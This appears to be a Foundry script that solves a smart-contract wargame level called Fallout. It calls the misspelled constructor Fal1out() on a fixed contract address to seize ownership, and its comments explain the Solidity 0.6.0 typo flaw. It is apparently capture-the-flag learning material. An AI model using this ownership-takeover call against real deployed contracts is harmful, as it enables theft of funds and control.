// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;


import "forge-std/Script.sol";
import '../src/Fallout.sol';

contract FalloutScript is Script {
   
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // get the instance of the contract
        Fallout instance = Fallout(payable(0x931f8660147049B7cD82353d360A383f95f72c25));

        //this is old solidity 0.6.0 syntax, so there is a typo in the constructor function. 
        //This would not be possible in solidity 0.8.0

        instance.Fal1out();

        vm.stopBroadcast();
    }

}
